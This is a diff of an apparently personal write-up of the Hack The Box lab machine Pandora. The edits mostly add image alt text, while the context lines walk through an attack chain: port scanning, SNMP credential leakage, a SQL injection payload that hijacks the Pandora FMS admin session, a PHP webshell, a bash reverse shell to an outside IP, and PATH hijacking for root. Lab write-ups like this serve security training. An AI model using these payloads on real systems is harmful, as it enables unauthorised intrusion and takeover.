@@ -1,4 +1,4 @@
-# HTB - Pandora
+﻿# HTB - Pandora
 
 **IP Address:** `10.10.11.136`  
 **OS:** Ubuntu (Focal)  
@@ -36,7 +36,7 @@ Privilege escalation is achieved by abusing a misconfigured binary (`pandora_bac
 ping -c 1 10.10.11.136
 ```
 
-![](screenshots/ping.png)
+![ping](screenshots/ping.png)
 
 The host responds, confirming it is alive.
 
@@ -54,7 +54,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.136 -oG allPorts
 - `-Pn`: Skip host discovery (already confirmed alive)  
 - `-oG`: Output in grepable format
 
-![](screenshots/allports.png)
+![allports](screenshots/allports.png)
 
 Extract open ports:
 
@@ -62,7 +62,7 @@ Extract open ports:
 extractPorts allPorts
 ```
 
-![](screenshots/extractports.png)
+![extractports](screenshots/extractports.png)
 
 ---
 ### 1.3 Targeted Scan
@@ -75,13 +75,8 @@ nmap -p22,80 -sC -sV 10.10.11.136 -oN targeted
 - `-sV`: Detect service versions  
 - `-oN`: Output in human-readable format  
 
-Let's check the result:
 
-```bash
-cat targeted -l java
-```
-
-![](screenshots/targeted.png)
+![targeted](screenshots/targeted.png)
 
 | Port | Service | Version/Description |
 |------|---------|---------------------|
@@ -93,7 +88,7 @@ cat targeted -l java
 
 Check Ubuntu release via **launchpad**:
 
-![](screenshots/launchpad.png)
+![launchpad](screenshots/launchpad.png)
 
 Ubuntu version: **Focal**.
 
@@ -103,7 +98,7 @@ Fingerprint web technologies:
 whatweb http://10.10.11.136
 ```
 
-![](screenshots/whatweb.png)
+![whatweb](screenshots/whatweb.png)
 
 Interesting findings:
 - Domain → `panda.htb`
@@ -111,11 +106,11 @@ Interesting findings:
 
 Browsing main page:
 
-![](screenshots/web.png)
+![web](screenshots/web.png)
 
 Contact form confirms valid emails:
 
-![](screenshots/web_contact.png)
+![web_contact](screenshots/web_contact.png)
 
 ### 2.1 Directory Enumeration
 
@@ -123,14 +118,14 @@ Contact form confirms valid emails:
 gobuster dir -u http://panda.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200
 ```
 
-![](screenshots/gobuster.png)
+![gobuster](screenshots/gobuster.png)
 
 Results:
 - `/assets/` → Directory listing but nothing useful  
 - `/server-status/` → Forbidden  
 
-![](screenshots/directory_listing_assets.png)  
-![](screenshots/directory_listing_server_status.png)
+![directory_listing_assets](screenshots/directory_listing_assets.png)  
+![directory_listing_server_status](screenshots/directory_listing_server_status.png)
 
 Blocked here, we pivot to **UDP enumeration**.
 
@@ -143,7 +138,7 @@ Blocked here, we pivot to **UDP enumeration**.
 sudo nmap -sU --top-ports 100 --open -T5 -v -n 10.10.11.136
 ```
 
-![](screenshots/nmap_udp.png)
+![nmap_udp](screenshots/nmap_udp.png)
 
 Port `161/udp` open → **SNMP**.
 
@@ -153,24 +148,24 @@ Deep scan:
 sudo nmap -sUCV -p161 10.10.11.136 -oN UDPScan
 ```
 
-![](screenshots/udpscan_analysis.png)
+![udpscan_analysis](screenshots/udpscan_analysis.png)
 
 Interesting findings:
 - UID 835 → User **Debian**
 - UID 1100 → Credentials: `daniel // HotelBabylon23`
 
-![](screenshots/udpscan_credentials.png)
+![udpscan_credentials](screenshots/udpscan_credentials.png)
 
 ---
 ## 4. Foothold
 
 SSH access with leaked credentials:
 
-![](screenshots/ssh_daniel.png)
+![ssh_daniel](screenshots/ssh_daniel.png)
 
 We land as **daniel** but user flag belongs to **matt**:
 
-![](screenshots/user_flag_fail.png)
+![user_flag_fail](screenshots/user_flag_fail.png)
 
 ### 4.1 Privilege Enumeration
 
@@ -178,14 +173,14 @@ We land as **daniel** but user flag belongs to **matt**:
 find -perm -4000 2>/dev/null
 ```
 
-![](screenshots/priv.png)
+![priv](screenshots/priv.png)
 
 Suspicious binary: `pandora_backup`.
 
 Exploring `/var/www/html/` reveals `pandora_console`:
 
-![](screenshots/pandora_console.png)  
-![](screenshots/pandora_console_info.png)
+![pandora_console](screenshots/pandora_console.png)  
+![pandora_console_info](screenshots/pandora_console_info.png)
 
 Configuration file discloses hidden domain: **pandora.panda.htb** (port 80).
 
@@ -195,7 +190,7 @@ Validate via cURL:
 curl localhost
 ```
 
-![](screenshots/pandora_console_curl.png)
+![pandora_console_curl](screenshots/pandora_console_curl.png)
 
 ### 4.2 Local Port Forwarding
 
@@ -213,7 +208,7 @@ ssh daniel@10.10.11.136 -L 80:127.0.0.1:80
 
 Now accessible at `127.0.0.1:80`:
 
-![](screenshots/pandora_console_web.png)
+![pandora_console_web](screenshots/pandora_console_web.png)
 
 ---
 ## 5. Exploitation
@@ -227,11 +222,11 @@ SQLi to hijack admin session:
 include/chart_generator.php?session_id=%27%20union%20SELECT%201,2,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20--%20SgGO
 ```
 
-![](screenshots/pandora_console_cookie_admin.png)
+![pandora_console_cookie_admin](screenshots/pandora_console_cookie_admin.png)
 
 Cookie updated, if we refresh the website,  the admin login is successful:
 
-![](screenshots/pandora_console_login.png)
+![pandora_console_login](screenshots/pandora_console_login.png)
 
 ### 5.1 File Upload for RCE
 
@@ -243,15 +238,15 @@ Access File Manager, upload PHP webshell:
 ?>
 ```
 
-![](screenshots/cmd_php.png)
+![cmd_php](screenshots/cmd_php.png)
 
 Uploaded successfully:
 
-![](screenshots/pandora_console_cmd_php.png)
+![pandora_console_cmd_php](screenshots/pandora_console_cmd_php.png)
 
 Execute commands via browser:
 
-![](screenshots/pandora_console_web_console.png)
+![pandora_console_web_console](screenshots/pandora_console_web_console.png)
 
 Reverse shell setup:
 
@@ -266,10 +261,10 @@ Final payload (URL-encoded):
 http://127.0.0.1/pandora_console/images/0.Pwn3d/cmd.php?cmd=bash -c "bash -i >%26 /dev/tcp/10.10.14.10/443 0>%261"
 ```
 
-![](screenshots/pandora_console_netcat.png)
+![pandora_console_netcat](screenshots/pandora_console_netcat.png)
 
 ✅ **User flag obtained**  
-![](screenshots/user_flag.png)
+![user_flag](screenshots/user_flag.png)
 
 ---
 ## 6. Privilege Escalation
@@ -282,8 +277,8 @@ Generate SSH keys:
 ssh-keygen
 ```
 
-![](screenshots/ssh_id_rsa.png)  
-![](screenshots/id_rsa.png)
+![ssh_id_rsa](screenshots/ssh_id_rsa.png)  
+![id_rsa](screenshots/id_rsa.png)
 
 Connect as matt:
 
@@ -299,7 +294,7 @@ Check binary:
 ls -l ./usr/bin/pandora_backup
 ```
 
-![](screenshots/pandora_backup_priv.png)
+![pandora_backup_priv](screenshots/pandora_backup_priv.png)
 
 Trace execution:
 
@@ -307,7 +302,7 @@ Trace execution:
 ltrace ./usr/bin/pandora_backup
 ```
 
-![](screenshots/pandora_backup_code.png)
+![pandora_backup_code](screenshots/pandora_backup_code.png)
 
 Finds `tar` called with **relative path** → vulnerable to **path hijacking**.
 
@@ -322,11 +317,11 @@ export PATH=/tmp:$PATH
 echo $PATH
 ```
 
-![](screenshots/tar_file.png)  
-![](screenshots/path_hijacking.png)
+![tar_file](screenshots/tar_file.png)  
+![path_hijacking](screenshots/path_hijacking.png)
 
 🏁 **Root flag obtained**  
-![](screenshots/root_flag.png)
+![root_flag](screenshots/root_flag.png)
 
 ---
 # ✅ MACHINE COMPLETE
